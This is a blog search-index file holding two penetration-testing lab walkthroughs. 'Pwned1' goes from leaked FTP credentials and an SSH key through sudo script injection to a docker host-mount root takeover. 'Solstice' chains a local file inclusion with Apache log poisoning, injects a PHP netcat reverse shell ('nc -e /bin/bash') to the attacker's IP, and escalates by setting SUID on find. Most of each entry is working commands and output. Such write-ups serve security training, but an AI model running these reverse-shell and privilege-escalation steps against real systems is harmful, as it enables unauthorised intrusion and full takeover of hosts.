<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Pwned1</title>
    <url>/undefined/Pwned1/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-Pwned1"><a href="#Exploitation-Guide-for-Pwned1" class="headerlink" title="Exploitation Guide for Pwned1"></a><strong>Exploitation Guide for Pwned1</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><p>This machine is exploited by disclosure of ftp user credentials and downloadable SSH key in the ftp folder.It is escalated via a vulnerable sudo script and docker group privileges.</p>
<span id="more"></span>

<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ nmap 192.168.120.220</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-08 16:54 EDT</span><br><span class="line">Nmap scan report for 192.168.120.220</span><br><span class="line">Host is up (0.038s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Web-application"><a href="#Web-application" class="headerlink" title="Web application"></a><strong>Web application</strong></h3><p>We start off by exploring the web app.There is nothing really worthy on the main page but the <code>/robots.txt</code> page reveals interesting pages to explore.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.220/robots.txt</span><br><span class="line"># Group 1</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Allow: /nothing</span><br><span class="line">Allow: /hidden_text</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Exploring that <code>/hidden_text</code> page, we find a directory listing which leads to <code>/secret.dic</code> page.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.220/hidden_text/secret.dic</span><br><span class="line">/hacked</span><br><span class="line">/vanakam_nanba</span><br><span class="line">/hackerman.gif</span><br><span class="line">/facebook</span><br><span class="line">/whatsapp</span><br><span class="line">/instagram</span><br><span class="line">/pwned</span><br><span class="line">/pwned.com</span><br><span class="line">/pubg</span><br><span class="line">/cod</span><br><span class="line">/fortnite</span><br><span class="line">/youtube</span><br><span class="line">/kali.org</span><br><span class="line">/hacked.vuln</span><br><span class="line">/users.vuln</span><br><span class="line">/passwd.vuln</span><br><span class="line">/pwned.vuln</span><br><span class="line">/backup.vuln</span><br><span class="line">/.ssh</span><br><span class="line">/root</span><br><span class="line">/home</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We try a few of those but most don’t seem to work. Let’s automate the tries instead of checking them all one by one.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.220/hidden_text/secret.dic &gt; /tmp/secret.dic</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">kali@kali:~$ gobuster dir -u http://192.168.120.220 -w /tmp/secret.dic</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.120.220</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /tmp/secret.dic</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2020/09/08 17:11:35 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">//pwned.vuln (Status: 301)</span><br><span class="line">===============================================================</span><br><span class="line">2020/09/08 17:11:36 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We find that only <code>/pwned.vuln</code> is valid. If we go to that page, we can find some credentials in the comments.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.220/pwned.vuln/</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">...</span><br><span class="line">&lt;?php</span><br><span class="line">...</span><br><span class="line">//	if ($un==&#x27;ftpuser&#x27; &amp;&amp; $pw==&#x27;B0ss_Pr!ncesS&#x27;) &#123;</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Exploring-the-FTP-server"><a href="#Exploring-the-FTP-server" class="headerlink" title="Exploring the FTP server"></a><strong>Exploring the FTP server</strong></h3><p>By using the credentials found earlier, we can log in to the FTP server. In it, we find two interesting files.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ ftp 192.168.120.220</span><br><span class="line">Connected to 192.168.120.220.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.120.220:vagrant): ftpuser</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Jul 10 12:47 share</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cd share</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0            2602 Jul 09 15:05 id_rsa</span><br><span class="line">-rw-r--r--    1 0        0              75 Jul 09 17:41 note.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The first one is a private SSH key, and the other one is a note that conveniently contains the associated username.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ cat note.txt</span><br><span class="line"></span><br><span class="line">Wow you are here</span><br><span class="line"></span><br><span class="line">ariana won&#x27;t happy about this note</span><br><span class="line"></span><br><span class="line">sorry ariana :(</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a><strong>SSH</strong></h3><p>Using the <strong>id_rsa</strong> key we found, we can SSH to the machine.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ chmod 400 id_rsa</span><br><span class="line">kali@kali:~$ ssh -i id_rsa ariana@192.168.120.220</span><br><span class="line">...</span><br><span class="line">ariana@pwned:~$ id</span><br><span class="line">uid=1000(ariana) gid=1000(ariana) groups=1000(ariana),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="Local-Enumeration"><a href="#Local-Enumeration" class="headerlink" title="Local Enumeration"></a><strong>Local Enumeration</strong></h3><p>Let’s look at the commands our user is allowed to run with <code>sudo</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ariana@pwned:~$ sudo -l</span><br><span class="line">Matching Defaults entries for ariana on pwned:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User ariana may run the following commands on pwned:</span><br><span class="line">    (selena) NOPASSWD: /home/messenger.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Let’s see this script with <code>cat /home/messenger.sh</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">clear</span><br><span class="line">echo &quot;Welcome to linux.messenger &quot;</span><br><span class="line">		echo &quot;&quot;</span><br><span class="line">users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)</span><br><span class="line">		echo &quot;&quot;</span><br><span class="line">echo &quot;$users&quot;</span><br><span class="line">		echo &quot;&quot;</span><br><span class="line">read -p &quot;Enter username to send message : &quot; name</span><br><span class="line">		echo &quot;&quot;</span><br><span class="line">read -p &quot;Enter message for $name :&quot; msg</span><br><span class="line">		echo &quot;&quot;</span><br><span class="line">echo &quot;Sending message to $name &quot;</span><br><span class="line"></span><br><span class="line">$msg 2&gt; /dev/null</span><br><span class="line"></span><br><span class="line">		echo &quot;&quot;</span><br><span class="line">echo &quot;Message sent to $name :) &quot;</span><br><span class="line">		echo &quot;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Exploiting-the-script"><a href="#Exploiting-the-script" class="headerlink" title="Exploiting the script"></a><strong>Exploiting the script</strong></h3><p>Looks like this script is running what we pass to the “Enter message for $name” prompt and then sends it to <code>/dev/null</code>.We can use this to run a shell. Since we run it as sudo, this will give us a shell as the selena user.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ariana@pwned:~$ sudo -u selena /home/messenger.sh</span><br><span class="line"></span><br><span class="line">Welcome to linux.messenger</span><br><span class="line"></span><br><span class="line">ariana:</span><br><span class="line">selena:</span><br><span class="line">ftpuser:</span><br><span class="line"></span><br><span class="line">Enter username to send message : whatever</span><br><span class="line"></span><br><span class="line">Enter message for whatever :/bin/bash</span><br><span class="line"></span><br><span class="line">Sending message to whatever</span><br><span class="line">id</span><br><span class="line">uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)</span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">selena@pwned:/home/ariana$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Escalating-to-root"><a href="#Escalating-to-root" class="headerlink" title="Escalating to root"></a><strong>Escalating to root</strong></h3><p>In the <code>id</code> command above, we can see that we are in the <strong>docker</strong> group.This allows us to do very nasty things: <a href="https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface">https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface</a></p>
<p>Let’s see what images are available.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">selena@pwned:/home/ariana$ docker image ls</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">privesc             latest              09ae39f0f8fc        2 months ago        88.3MB</span><br><span class="line">&lt;none&gt;              &lt;none&gt;              e13ad046d435        2 months ago        88.3MB</span><br><span class="line">alpine              latest              a24bb4013296        3 months ago        5.57MB</span><br><span class="line">debian              wheezy              10fcec6d95c4        18 months ago       88.3MB</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>alpine</strong> images are usually pretty bare bones but any of the other 2 images will do just fine for our needs (<strong>privesc</strong> is a fairly obvious hint, but we don’t need to use that one).As shown by the link above, we can mount the host’s <code>/</code> folder inside of a container.Since SSH is open on the machine, we’ll use this to edit the root’s <strong>authorized_keys</strong> file.</p>
<p>We can simply paste our host’s public key here.If you don’t have an SSH key pair created, you can use the <code>ssh-keygen</code> command.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">selena@pwned:/home/ariana$ docker run -it -v /:/host debian:wheezy sh</span><br><span class="line"># cd /host/root</span><br><span class="line"># ls -al</span><br><span class="line">total 28</span><br><span class="line">drwx------  3 root root 4096 Jul 10 07:32 .</span><br><span class="line">drwxr-xr-x 18 root root 4096 Aug 11 08:14 ..</span><br><span class="line">-rw-------  1 root root  264 Sep  8 19:53 .bash_history</span><br><span class="line">-rw-r--r--  1 root root  601 Jul  6 12:40 .bashrc</span><br><span class="line">drwxr-xr-x  3 root root 4096 Jul  4 14:02 .local</span><br><span class="line">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span><br><span class="line">-rw-r--r--  1 root root  429 Jul 10 06:41 root.txt</span><br><span class="line"># mkdir .ssh</span><br><span class="line"># echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcKw2si1MnX9Zc2qlnoPvILKv9EI/2hISK4Gy0a6cIMRjys3oxkv5CEBdSMCA33K8IDniHC6vhf1D9xM9fjjEgocu45CJnRtGyX4ewfduqdwkQlOirqStYP9mjkjmqSj65dU3fAk3LZjZNxUjPPY7GvELeJyLzIUlOgnWKKo/sYOcyHcG9PZpQDngcEJ5jbEs/8meNp+ejaGUegyn8TZfG/4Gy18uUkIEV1Muc2Xc9e+KQOWZ3SehxJQwqGZycTGJBy49hA8/1iHOsyQyr/lgnkVewEyB2i9tN7WqrZeMY+DqvDP/qxIHGf4U17NKqM/npAAviH6noeDBZZEQq56Ad kali@kali&#x27; &gt; .ssh/authorized_keys</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Then we can SSH to the machine as root.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ ssh root@192.168.120.220</span><br><span class="line">...</span><br><span class="line">root@pwned:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<p>Focus:</p>
<p>docker提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -v /:/mnt --rm -it privesc chroot /mnt sh</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>Script</tag>
        <tag>Ftp</tag>
      </tags>
  </entry>
  <entry>
    <title>Solstice</title>
    <url>/undefined/Solstice/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-Solstice"><a href="#Exploitation-Guide-for-Solstice" class="headerlink" title="Exploitation Guide for Solstice"></a><strong>Exploitation Guide for Solstice</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><p>This machine is exploited by combining a LFI with a log poisoning attack. It is escalated with a world-writable file.</p>
<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -p- -sV 192.168.120.167</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-11 16:27 EDT</span><br><span class="line">Nmap scan report for 192.168.120.167</span><br><span class="line">Host is up (0.043s latency).</span><br><span class="line">Not shown: 65428 closed ports, 96 filtered ports</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">21/tcp    open  ftp         pyftpdlib 1.5.6</span><br><span class="line">22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">25/tcp    open  smtp        Exim smtpd 4.92</span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.38 ((Debian))</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">2121/tcp  open  ftp         pyftpdlib 1.5.6</span><br><span class="line">3128/tcp  open  http-proxy  Squid http proxy 4.6</span><br><span class="line">8593/tcp  open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)</span><br><span class="line">54787/tcp open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)</span><br><span class="line">62524/tcp open  ftp         FreeFloat ftpd 1.00</span><br><span class="line">Service Info: Host: solstice; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Web-server-on-port-8593"><a href="#Web-server-on-port-8593" class="headerlink" title="Web server on port 8593"></a><strong>Web server on port 8593</strong></h3><p>This web app appears to be under construction, with only a limited number of functionalities available to us.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.167:8593</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">	&lt;link href=&quot;https://fonts.googleapis.com/css?family=Comic+Sans&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">	&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;menu&quot;&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php&quot;&gt;Main Page&lt;/a&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php?book=list&quot;&gt;Book List&lt;/a&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">We are still setting up the library! Try later on!&lt;p&gt;&lt;/p&gt;    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>By executing a simple manual fuzzing, we find a LFI vulnerability in the <code>book</code> parameter, allowing us to few the contents of <strong>/etc/passwd</strong>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.167:8593?book=../../../../../etc/passwd</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">	&lt;link href=&quot;https://fonts.googleapis.com/css?family=Comic+Sans&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">	&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;menu&quot;&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php&quot;&gt;Main Page&lt;/a&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php?book=list&quot;&gt;Book List&lt;/a&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">We are still setting up the library! Try later on!&lt;p&gt;root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">avahi:x:106:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">saned:x:107:118::/var/lib/saned:/usr/sbin/nologin</span><br><span class="line">colord:x:108:119:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">hplip:x:109:7:HPLIP system user,,,:/var/run/hplip:/bin/false</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:111:120:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">miguel:x:1000:1000:,,,:/home/miguel:/bin/bash</span><br><span class="line">uuidd:x:112:121::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">smmta:x:113:122:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin</span><br><span class="line">smmsp:x:114:123:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin</span><br><span class="line">Debian-exim:x:115:124::/var/spool/exim4:/usr/sbin/nologin</span><br><span class="line">&lt;/p&gt;    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Web-server-on-port-80"><a href="#Web-server-on-port-80" class="headerlink" title="Web server on port 80"></a><strong>Web server on port 80</strong></h3><p>Now that we have a LFI on the one application, we can attempt to poison the log file of the web application running on port 80. This can be achieved by sending a malicious PHP command to the web application.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ echo &quot;GET &lt;?php echo &#x27;TEST123&#x27; ?&gt; HTTP/1.1&quot; | nc 192.168.120.167 80</span><br><span class="line">HTTP/1.1 400 Bad Request</span><br><span class="line">Date: Tue, 11 Aug 2020 21:16:09 GMT</span><br><span class="line">Server: Apache/2.4.38 (Debian)</span><br><span class="line">Content-Length: 301</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=iso-8859-1</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;400 Bad Request&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Bad Request&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;address&gt;Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 80&lt;/address&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Then use the LFI to verify if the attack worked.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.167:8593?book=../../../../../var/log/apache2/access.log</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">	&lt;link href=&quot;https://fonts.googleapis.com/css?family=Comic+Sans&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">	&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;menu&quot;&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php&quot;&gt;Main Page&lt;/a&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php?book=list&quot;&gt;Book List&lt;/a&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">We are still setting up the library! Try later on!&lt;p&gt;192.168.118.9 - - [11/Aug/2020:17:16:09 -0400] &quot;GET TEST123 HTTP/1.1\n&quot; 400 0 &quot;-&quot; &quot;-&quot;</span><br><span class="line">&lt;/p&gt;    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>As we can see, the php code got executed. We can use this to execute commands.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Injecting-the-payload"><a href="#Injecting-the-payload" class="headerlink" title="Injecting the payload"></a><strong>Injecting the payload</strong></h3><p>We can use the log poisoning attack to inject our payload.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ echo &quot;GET &lt;?php system(&#x27;nc -e /bin/bash 192.168.118.9 444&#x27;); ?&gt; HTTP/1.1&quot; | nc 192.168.120.167 80</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Executing-it"><a href="#Executing-it" class="headerlink" title="Executing it"></a><strong>Executing it</strong></h3><p>First, start our listener.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nc -nvlp 444</span><br><span class="line">listening on [any] 444 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Then trigger it with the LFI.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.167:8593?book=../../../../../var/log/apache2/access.log</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We receive our shell.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nc -nvlp 444</span><br><span class="line">listening on [any] 444 ...</span><br><span class="line">connect to [192.168.118.9] from (UNKNOWN) [192.168.120.167] 52810</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line"></span><br><span class="line">python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">www-data@solstice:/var/tmp/webserver$</span><br><span class="line"></span><br><span class="line">www-data@solstice:/var/tmp/webserver$ stty rows 50 cols 250</span><br><span class="line">stty rows 50 cols 250</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><p>Checking the running processes, we can find a local web server running as root.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ ps aux</span><br><span class="line">ps aux</span><br><span class="line">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">...</span><br><span class="line">root       474  0.0  0.0   2388   756 ?        Ss   Aug11   0:00 /bin/sh -c /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/</span><br><span class="line">...</span><br><span class="line">root       480  0.0  2.0 196744 21104 ?        S    Aug11   0:01 /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>If we look into that folder, we can see that the <strong>index.php</strong> file is world-writable.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ ls -l /var/tmp/sv</span><br><span class="line">ls -l /var/tmp/sv</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxrwx 1 root root 36 Jun 19 00:01 index.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We can use it to execute commands as root. Let’s make <code>find</code> run with the SUID bit.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ echo &quot;&lt;?php system(&#x27;chmod +s /usr/bin/find&#x27;); ?&gt;&quot; &gt; /var/tmp/sv/index.php</span><br><span class="line">echo &quot;&lt;?php system(&#x27;chmod +s /usr/bin/find&#x27;); ?&gt;&quot; &gt; /var/tmp/sv/index.php</span><br><span class="line"></span><br><span class="line">www-data@solstice:/var/tmp/webserver$ curl localhost:57</span><br><span class="line">curl localhost:57</span><br><span class="line"></span><br><span class="line">www-data@solstice:/var/tmp/webserver$ ls -l /usr/bin/find</span><br><span class="line">ls -l /usr/bin/find</span><br><span class="line">-rwsr-sr-x 1 root root 315904 Feb 16  2019 /usr/bin/find</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Then use <code>find</code> to escalate our shell.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ find . -exec /bin/bash -p \; -quit</span><br><span class="line">find . -exec /bin/bash -p \; -quit</span><br><span class="line">bash-5.0# id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>LFI</tag>
        <tag>Web Server</tag>
      </tags>
  </entry>
</search>
